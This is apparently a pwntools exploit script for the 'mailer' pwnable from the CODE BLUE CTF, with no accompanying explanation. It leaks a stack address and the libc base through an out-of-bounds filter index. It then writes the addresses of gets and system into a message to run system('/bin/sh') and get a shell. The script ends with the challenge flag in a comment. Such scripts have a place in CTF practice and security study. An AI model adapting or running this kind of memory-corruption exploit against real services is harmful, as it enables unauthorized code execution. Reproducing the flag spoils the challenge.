from pwn import *
import sys

def leak(addr, size, title=""):
	print "*** {} : {} ***".format(hex(addr), title)
	print hexdump(r.leak(addr, size), begin=addr, skip=False)

IP = 'sms.tasks.ctf.codeblue.jp'
PORT = 6029
FN = './mailer'

if len(sys.argv)>1:
    r = remote(IP,PORT)
    e = ELF('./libc.so.6')
else:
    r = process(FN)
    e = ELF('/lib/i386-linux-gnu/libc.so.6')

c0 = lambda: r.recvuntil('>')
s = lambda x: r.sendline(str(x))

def pAdd(contents):
	s(1)
	r.recvuntil(':')
	s(contents)

def pDelete(idx):
	s(2)
	r.recvuntil(':')
	s(idx)

def pPost(idx, f, ret=False):
	s(3)
	r.recvuntil(':')
	s(idx)
	c0()
	s(f)
	if ret:
		return r.recvuntil('1.').split('\x0a\x44\x6f\x6e\x65\x21\x0a\x0a\x31\x2e')[0]

FILTER_BASE = 0x0804B048
PRINTF = -14
SETBUF = -15
MEMSET = -4
io_stderr_offset = 0x1b2cc0
system_offset = e.symbols['system']
gets_offset = e.symbols['gets']

raw_input()
# Leak Stack addr
c0()
pAdd('A')
c0()
pPost(0,SETBUF)
c0()
stackLeak = u32(pPost(0,PRINTF,ret=True)[5:5+4])
print "[*] Stack Address : %s"%(hex(stackLeak))

# Leak Libc addr
c0()
pDelete(0)
c0()
pAdd('AAAA'*13)
c0()
pPost(0,MEMSET)
c0()
libcLeak = u32(pPost(0,PRINTF,ret=True)[-5:-1])-io_stderr_offset
print "[*] Libc Base Address : %s"%(hex(libcLeak))

# gets /bin/sh
c0()
pDelete(0)
c0()
pAdd(p32(libcLeak + gets_offset))
c0()
pPost(0,(((stackLeak - FILTER_BASE) - 0x100000000) / 4))
s('/bin/sh;\x00')

# call system('/bin/sh')
c0()
pDelete(0)
c0()
pAdd(p32(libcLeak + system_offset))
c0()
pPost(0,(((stackLeak - FILTER_BASE) - 0x100000000) / 4))

r.interactive()

# CBCTF{4R3_YOU_w4RM3D_UP_f0R_MORE_PWNabLeS?}
